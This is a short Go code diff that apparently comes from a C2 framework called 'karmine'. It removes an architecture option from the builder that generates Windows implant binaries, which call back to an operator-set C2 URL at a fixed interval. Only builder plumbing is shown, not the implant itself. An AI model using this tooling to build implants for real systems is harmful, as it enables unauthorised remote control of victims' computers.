@@ -23,7 +23,6 @@ var (
 	app      = kingpin.New("new", "create new karmine binary instances")
 	karmaCmd = app.Command("karma", "create a karma instance (windows only)")
 	outfile  = app.Flag("outfile", "write instance to a location").String()
-	arch     = karmaCmd.Flag("arch", "architecture to compile binary for").Default("amd64").String()
 	waitSec  = karmaCmd.Flag("interval", "time interval between c2 callouts in seconds").Default("60").String()
 
 	conf = &models.TmpConf{}
@@ -45,7 +44,7 @@ func main() {
 	switch kingpin.MustParse(app.Parse(os.Args[1:])) {
 	case karmaCmd.FullCommand():
 		c2 := "https://" + conf.LHost + ":" + conf.LPort + conf.Endpoint
-		id, err = Karma(*arch, c2, *waitSec, db)
+		id, err = Karma(c2, *waitSec, db)
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -63,7 +62,7 @@ func RandString() string {
 	return string(dst)
 }
 
-func Karma(GOARCH, C2, waitSecs string, db *datastore.Kdb) (string, error) {
+func Karma(C2, waitSecs string, db *datastore.Kdb) (string, error) {
 	conf, err := config.GetFullConfig()
 	if err != nil {
 		return "", err
@@ -106,7 +105,6 @@ func Karma(GOARCH, C2, waitSecs string, db *datastore.Kdb) (string, error) {
 	}
 	cmd := exec.Command(
 		build,
-		GOARCH,
 		encC2,
 		waitSecs,
 		cert,
